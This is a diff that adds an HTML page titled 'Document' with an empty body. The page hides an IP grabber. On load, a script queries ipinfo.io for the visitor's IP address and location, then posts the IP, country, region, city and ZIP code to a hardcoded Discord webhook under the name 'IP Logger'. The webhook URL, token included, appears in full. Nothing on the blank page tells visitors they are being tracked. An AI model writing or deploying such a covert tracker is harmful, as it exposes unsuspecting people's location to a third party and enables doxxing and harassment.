@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    function monke(json) 
+    {
+         var request = new XMLHttpRequest();
+         
+         request.open("POST", "https://discord.com/api/webhooks/1143534212507504704/K9O_d9nO6Wabg038xKvvlXVOdlvceE1brKHr3_xbdJYBBg4hX8--pJCb7E_kZU-y93k7");
+    
+         request.setRequestHeader('Content-type', 'application/json');
+    
+         var params = 
+         {
+              username: "IP Logger",
+              avatar_url: "",
+              content: "@everyone",
+              embeds: [
+                   {
+                        title: "Someone visited the IP grabber!",
+                        color: 1752220,
+                        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                   }
+              ]
+         }
+    
+         request.send(JSON.stringify(params));
+    }
+    </script>
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+</html>
